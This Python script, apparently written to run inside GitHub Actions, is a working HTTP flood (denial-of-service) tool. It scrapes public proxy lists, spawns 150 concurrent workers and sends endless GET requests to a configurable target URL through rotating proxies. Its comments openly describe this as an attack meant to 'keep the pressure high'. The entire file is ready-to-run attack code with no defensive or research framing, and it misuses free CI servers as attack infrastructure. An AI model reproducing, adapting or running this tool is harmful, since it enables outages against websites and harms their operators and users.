import asyncio
import aiohttp
import os
import re
import sys

# Forces GitHub to show logs immediately
def log(msg):
    print(f"{msg}", flush=True)

class SparxCloudV11:
    def __init__(self):
        self.target = os.environ.get("TARGET_URL", "")
        self.proxies = []
        self.stats = {"success": 0, "failed": 0}
        # 150 workers is the "Sweet Spot" for GitHub servers
        self.concurrency = 150 

    async def get_proxies(self, session):
        log("🛰️ CONNECTING TO GLOBAL PROXY NODES...")
        # High-speed API sources only
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=500",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
        ]
        for url in sources:
            try:
                async with session.get(url, timeout=5) as resp:
                    data = await resp.text()
                    ips = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', data)
                    self.proxies.extend(ips)
            except: continue
        log(f"✅ READY: {len(self.proxies)} Proxies Injected.")

    async def worker(self, session, sem):
        while True:
            for p in self.proxies:
                async with sem:
                    try:
                        # Ultra-fast timeout to keep the pressure high
                        async with session.get(self.target, proxy=f"http://{p}", timeout=3) as r:
                            if r.status == 200:
                                self.stats["success"] += 1
                            else:
                                self.stats["failed"] += 1
                    except:
                        self.stats["failed"] += 1
                
                # Update logs every 20 hits so you see the screen moving
                if (self.stats["success"] + self.stats["failed"]) % 20 == 0:
                    log(f"🚀 NITRO >> HITS: {self.stats['success']} | FAIL: {self.stats['failed']}")

    async def start(self):
        if not self.target:
            log("❌ ERROR: TARGET_URL is empty!")
            return

        log(f"🔥 TARGET ACQUIRED: {self.target}")
        sem = asyncio.Semaphore(self.concurrency)
        
        async with aiohttp.ClientSession() as session:
            await self.get_proxies(session)
            # Launch parallel attack threads
            tasks = [self.worker(session, sem) for _ in range(self.concurrency)]
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(SparxCloudV11().start())
